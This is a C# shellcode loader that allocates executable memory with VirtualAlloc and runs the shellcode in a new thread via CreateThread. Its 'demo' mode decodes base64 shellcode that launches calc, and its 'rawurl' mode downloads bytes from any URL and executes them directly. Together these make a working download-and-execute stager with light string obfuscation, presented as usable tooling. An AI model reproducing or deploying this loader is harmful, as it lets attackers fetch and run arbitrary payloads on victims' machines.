using System;
using System.Text;
using Microsoft.Win32;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Net;

public class Program
{
    public static UInt64 MEM_COMMIT = 0x1000;

    public static UInt64 PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32")]
    public static extern UInt64 VirtualAlloc(UInt64 lpStartAddr,UInt64 size, UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(
    UInt64 lpThreadAttributes,
    UInt64 dwStackSize,
    UInt64 lpStartAddress,
    IntPtr param,
    UInt64 dwCreationFlags,
    ref UInt64 lpThreadId
    );

    [DllImport("kernel32")]
    public static extern UInt64 WaitForSingleObject(
    IntPtr hHandle,
    UInt64 dwMilliseconds
    );   

    public static void Main(string[] args)
    {
        byte[] shellcode;

        if (args.Length == 0) {
            Console.WriteLine("Use demo, rawurl http://URL or file filename.");
        }

        switch (args[0])
        {
            case "demo":
                Console.WriteLine("Demo starting...");
                // Base64 encoded 64-bit shellcode to run calc
                string sc = "REPLACEME/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJ"
                +"SDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ"
                +"41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEA"
                +"AAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA=";
                shellcode = Convert.FromBase64String(sc.Replace("REPLACEME", ""));
                ExecShellcode64(shellcode);
                break;  
                /*      
            case "rawdemo":
                Console.WriteLine("Raw shellcode demo starting...");
                // Raw 64-bit shellcode to run calc
                shellcode = new byte[272] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x00 };
                ExecShellcode64(shellcode);
                break;      
                */                              
            case "rawurl":                
                string url = args[1];
                Console.WriteLine("URL requested is {0}:",url); 
                WebClient client = new WebClient();
                shellcode = client.DownloadData(url);
                ExecShellcode64(shellcode);
                break;              
            case "rawfile":
                string filename = args[1];
                Console.WriteLine("File name requested is {0}:",filename);
                break;                      
            case "exit":
                return;                      
            default:
                Console.WriteLine("Use demo, rawurl http://URL or file filename."); 
                break;
        }
    }
    static void ExecShellcode64(byte[] shellcode)
    {

        Console.WriteLine("The Fun is starting, let's deploy a shellcode....");

        UInt64 funcAddr = VirtualAlloc(0, (UInt64)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Console.WriteLine("Virtualloc used to allocate memory for the shellcode size.");

        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
        Console.WriteLine("Shellcode copied to the memory address received.");

        IntPtr hThread = IntPtr.Zero;
        UInt64 threadId = 0;
        IntPtr pinfo = IntPtr.Zero;
        Console.WriteLine("Variables set for the thread.");

        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        Console.WriteLine("CreateThread called.");
       
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        Console.WriteLine("Thread started, goodbye!");

        return;
    }


}